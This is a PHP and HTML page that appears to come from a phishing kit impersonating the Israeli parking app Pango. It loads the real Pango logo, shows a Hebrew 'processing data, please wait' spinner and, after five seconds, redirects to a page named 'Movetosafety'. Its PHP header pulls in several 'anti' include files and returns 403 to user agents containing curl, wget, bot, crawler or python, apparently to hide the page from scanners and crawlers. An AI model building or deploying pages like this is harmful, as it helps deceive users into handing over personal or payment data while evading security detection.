<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');


function blockSuspiciousUserAgent() {
    $botAgents = [
        'curl', 'wget', 'bot', 'crawler', 'spider', 'http', 'python', 'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs() {
    $blockedIPs = [
        '192.168.1.1', 
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}


blockSuspiciousUserAgent();
blockSuspiciousIPs();
?>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>מעבד נתונים</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f9f9f9;
        }
        .header {
            position: absolute;
            top: 0;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px 0;
            background-color: white;
            border-bottom: 1px solid #ddd;
        }
        .header img {
            height: 40px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #ccc;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
        h1 {
            font-size: 18px;
            color: #007bff;
            margin: 20px 0 0;
        }
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: white;
            padding: 15px 10px;
            border-top: 1px solid #ddd;
        }
        .footer ul {
            list-style: none;
            padding: 0;
            margin: 10px 0;
            text-align: center;
        }
        .footer ul li {
            margin: 5px 0;
            font-size: 14px;
            color: #555;
        }
        .footer ul li a {
            color: #007bff;
            text-decoration: none;
        }
        .footer ul li a:hover {
            text-decoration: underline;
        }
        .footer .download-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        .footer .download-buttons a {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 14px;
        }
        .footer .download-buttons a:hover {
            background-color: #0056b3;
        }
        @media (max-width: 768px) {
            .spinner {
                width: 40px;
                height: 40px;
            }
            h1 {
                font-size: 16px;
            }
            .footer ul li {
                font-size: 12px;
            }
        }
    </style>
    <script>

        setTimeout(() => {
            window.location.href = "Movetosafety";
        }, 5000);
    </script>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <img src="https://www.pango.co.il/tpl/website/img/logo.png" alt="Pango Logo">
    </div>

    <!-- Spinner and Message -->
    <div class="spinner"></div>
    <h1>מעבד נתונים, אנא המתן...</h1>

    <!-- Footer -->
    <div class="footer">
        <div class="download-buttons">
            <a href="#">Google Play</a>
            <a href="#">Apple Store</a>
        </div>
        <ul>
            <li><a href="#">הסדרים משפטיים</a></li>
            <li><a href="#">אפשרות הסרת שירותים</a></li>
            <li><a href="#">פרסומים</a></li>
            <li><a href="#">אבטחת מידע</a></li>
            <li><a href="#">תנאי שימוש פנגו</a></li>
            <li><a href="#">מדיניות פרטיות</a></li>
            <li><a href="#">עירוי פנגו</a></li>
            <li><a href="#">אודות</a></li>
            <li><a href="#">מפת אתר</a></li>
        </ul>
    </div>
</body>
</html>
